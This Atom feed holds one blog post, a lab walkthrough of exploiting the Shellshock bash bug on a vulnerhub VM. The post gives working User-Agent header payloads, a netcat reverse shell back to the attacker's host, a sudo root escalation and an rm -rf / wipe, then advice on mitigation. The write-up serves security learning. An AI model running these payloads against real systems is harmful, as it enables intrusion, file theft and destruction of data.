<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Shellshock | Knapsy's brain dump]]></title>
  <link href="http://knapsy.github.io/blog/categories/shellshock/atom.xml" rel="self"/>
  <link href="http://knapsy.github.io/"/>
  <updated>2014-10-16T22:02:52+11:00</updated>
  <id>http://knapsy.github.io/</id>
  <author>
    <name><![CDATA[Knapsy]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Basic Shellshock Exploitation]]></title>
    <link href="http://knapsy.github.io/blog/2014/10/07/basic-shellshock-exploitation/"/>
    <updated>2014-10-07T22:38:09+11:00</updated>
    <id>http://knapsy.github.io/blog/2014/10/07/basic-shellshock-exploitation</id>
    <content type="html"><![CDATA[<p>Unless you were living under the rock for the last 2 weeks or so, you probably heard about a vulnerability in Bourne Again Shell (BASH), aka &ldquo;Shellshock&rdquo; (who comes up with those names?!) aka &ldquo;Bash bug&rdquo; aka &ldquo;OMG! Internet is coming to an end&rdquo; aka&hellip; you get the idea :)</p>

<p>Working in security field, I have heard about it a lot, maybe even too much in the last couple weeks and, after it has been publicly announced, I saw lots of failed exploitation attempts hitting Internet facing servers under my jurisdiction.</p>

<p>I have researched the vulnerability (<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">CVE-2014-6271</a> and other flavours of it) a fair bit, saw heaps of malicious traffic, but actually never seen a successful exploit (well, that&rsquo;s a good thing I guess&hellip;) and never had a chance to play with it on an actual vulnerable machine.</p>

<p>And yet, here it comes <a href="http://vulnhub.com">vulnhub.com</a> again with a tiny VM created specifically for this purpose - to get your hands dirty with this particular vulnerability. So&hellip; let&rsquo;s get started, shall we?</p>

<!-- more -->


<h2>Shock that shell</h2>

<p>I&rsquo;ll omit the recon phase and just jump straight to the essence.</p>

<p>We have a simple VM running a web server on port 80, the site looks like this:</p>

<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/main_page.png" title="Main Page" alt="Main Page" /></p>

<p>Let&rsquo;s look at the source. Immediatelly we see something interesting:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'>    <span class="kd">function</span> <span class="nx">status</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">$</span><span class="p">.</span><span class="nx">getJSON</span><span class="p">(</span><span class="s2">&quot;/cgi-bin/status&quot;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="nx">$</span><span class="p">.</span><span class="nx">each</span><span class="p">(</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#infos&#39;</span><span class="p">).</span><span class="nx">append</span> <span class="p">(</span> <span class="s2">&quot;&lt;li&gt;&lt;b&gt;&quot;</span><span class="o">+</span><span class="nx">key</span><span class="o">+</span><span class="s2">&quot;&lt;/b&gt;: &quot;</span> <span class="o">+</span> <span class="nx">val</span> <span class="o">+</span> <span class="s2">&quot;&lt;/li&gt;&quot;</span> <span class="p">);</span>
</span><span class='line'>            <span class="p">});</span>
</span><span class='line'>        <span class="p">});</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nx">status</span><span class="p">();</span>
</span><span class='line'><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We have a cgi script that runs system commands and displays them on a webpage - all conditions met for our Shellshock vulnerability!</p>

<p>All we need to do now is to exploit the vulnerability by providing a crafted shell command in one of the HTTP headers, that then will be processed by the webserver as an environment variable and, as a result, executed on the system.</p>

<p>Generally, the most common HTTP headers that I saw being targeted are:</p>

<ul>
<li>User-Agent</li>
<li>Host</li>
<li>Referer</li>
</ul>


<p>Let&rsquo;s try modifying User-Agent header. I&rsquo;ll be using Burp repeater as it should be the easiest to play around with and modify the request when needed.</p>

<p>Start up burpsuite:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# burpsuite</span></code></pre></td></tr></table></div></figure></p>

<p>And craft the HTTP request:</p>

<p><em>Note: make sure there are 2 empty lines at the end of your raw request in Burp, otherwise the request won&rsquo;t work!</em></p>

<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp.png" title="Burp" alt=" burp " /></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;echo vulnerable!&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Response:</p>

<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp_fail.png" title="Burp fail response" alt=" Burp fail response " /></p>

<p>Hmm&hellip; no response displayed on the screen, neither in the headers (I saw some examples where echo came back in headers, I guess it&rsquo;s not the case in this instance).</p>

<p>Let&rsquo;s try some other commands:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;cat /etc/passwd&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>But again, the same error message and no output displayed back. Is it even working? Let&rsquo;s try to ping back our Kali.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;ping -c 3 172.16.246.129&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Listening for ping:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# tcpdump -i eth0 -n icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
</span><span class='line'>20:02:14.854659 IP 172.16.246.132 > 172.16.246.129: ICMP echo request, id 18947, seq 0, length 64
</span><span class='line'>20:02:14.854706 IP 172.16.246.129 > 172.16.246.132: ICMP echo reply, id 18947, seq 0, length 64
</span><span class='line'>20:02:15.856028 IP 172.16.246.132 > 172.16.246.129: ICMP echo request, id 18947, seq 1, length 64
</span><span class='line'>20:02:15.856050 IP 172.16.246.129 > 172.16.246.132: ICMP echo reply, id 18947, seq 1, length 64
</span><span class='line'>20:02:16.856425 IP 172.16.246.132 > 172.16.246.129: ICMP echo request, id 18947, seq 2, length 64
</span><span class='line'>20:02:16.856451 IP 172.16.246.129 > 172.16.246.132: ICMP echo reply, id 18947, seq 2, length 64</span></code></pre></td></tr></table></div></figure></p>

<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp_success.png" title="Burp success" alt=" Burp success " /></p>

<p>Aha! So it works and we&rsquo;re actually getting output displayed on the screen. How about chaining the commands then?</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;ping -c 3 172.16.246.129; id; cat /etc/passwd&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp_success_chain.png" title="Burp chain success" alt=" Burp chain success " /></p>

<p>As expected, all works fine! As you can see, we can do quite a lot of damage here. Let&rsquo;s get a shell (conviniently netcat is installed):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;nc 172.16.246.129 31337 -e /bin/sh&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Waiting for reverse shell:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvp 31337
</span><span class='line'>listening on [any] 31337 &hellip;
</span><span class='line'>172.16.246.132: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to [172.16.246.129] from (UNKNOWN) [172.16.246.132] 34190
</span><span class='line'>whoami
</span><span class='line'>pentesterlab
</span><span class='line'>id
</span><span class='line'>uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)</span></code></pre></td></tr></table></div></figure></p>

<p>And we have a shell! Just like this&hellip; scary huh?</p>

<p>Since there was no particular goal in the challange (no flag or anything), let&rsquo;s just try to get a root and do more damage (just for fun and because&hellip; I always wanted to do it :P).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -l
</span><span class='line'>User pentesterlab may run the following commands on this host:
</span><span class='line'>    (root) NOPASSWD: ALL</span></code></pre></td></tr></table></div></figure></p>

<p>Really? All of them? Easy, let&rsquo;s spawn a root shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -s
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>rm -rf /&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>And it&rsquo;s gone.</p>

<p>Obligatory disclaimer: <em>DON&rsquo;T TRY IT AT HOME! I take no responsibility for you wiping your (or anyone else&rsquo;s) filesystem off!</em></p>

<p>Imagine if that actually happened on a production server you own, containing lots of business critical data and/or services&hellip; yeah, it was that simple (at least to get an initial shell).</p>

<h2>Mitigation</h2>

<p>Since you have seen how easy it is to compromise vulnerable servers, the next question is, how to mitigate it?</p>

<p>First and foremost, that&rsquo;s a general advice, keep your system patched and up-to-date! As soon as a critical security patch is released, apply it! Especially on your Internet facing servers as they WILL sooner or later be scanned and heaps of exploits fired at them.</p>

<p>With this particular &ldquo;Shellshock&rdquo; vulnerability, vendors weren&rsquo;t great regarding releasing a patch. It took them a while and the patch that was released actually didn&rsquo;t fix the vulnerability completely (hence another 4 or so CVEs emerging shortly after the inital one).</p>

<p>So, what else can you do? Well, your environment set-up may come to the rescue here. Generally your Internet facing servers would be sitting behind a set of load balancers, proxies and firewalls - this <em>may</em> provide sufficient protection in some cases (e.g. egress firewall rules restricting outbound traffic, load balancers splitting traffic onto different servers, etc.).</p>

<p>If you have an IPS, deploy the rules to block malicious traffic - but as with IPSes, you may need to deal with false-positives. If you have an IDS, get a team to monitor it for alerts triggering on exploit traffic, analyse responses and potentially block abusing IP (but it&rsquo;s kind of a whack-a-mole game at that point).</p>

<p>And of course, as a general rule of thumb, if you don&rsquo;t need it - disable it! Use KSH or CSH or anything else instead (if you can).</p>

<p>There was (and probably still is), quite a bit of panic around this particular vulnerability, however, there must be quite a lot of conditions satisfied to successfully exploit it, therefore I don&rsquo;t think it&rsquo;s actually THAT easy to exploit it in the wild. Of course, there will be (and already are) instances of breaches utilising this vulnerability, but they would be quite specifically crafted for targeted environment. You probably won&rsquo;t be hugely successful going around and spraying an entire Internet with the same payload and hoping for the best&hellip; Heartbleed was a lot easier in that regard, but that&rsquo;s a completely different story :)</p>
]]></content>
  </entry>
  
</feed>
